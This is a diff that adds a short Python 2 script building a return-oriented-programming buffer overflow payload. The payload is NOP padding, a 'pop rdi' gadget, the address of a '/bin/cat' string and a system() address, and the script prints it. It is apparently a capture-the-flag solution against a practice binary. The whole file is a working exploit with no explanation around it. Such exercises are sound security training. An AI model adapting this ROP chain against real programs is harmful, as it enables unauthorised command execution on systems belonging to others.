@@ -1,0 +1,12 @@
+bincat = "\x60\x10\x60\x00\x00\x00\x00\x00"
+system = "\x10\x08\x40\x00\x00\x00\x00\x00"
+pop_rdi = "\x83\x08\x40\x00\x00\x00\x00\x00"
+padding = "\x90" * 40
+exploit = padding + pop_rdi +  bincat + system + "A" * 8 
+print exploit
+
+
+
+
+
+
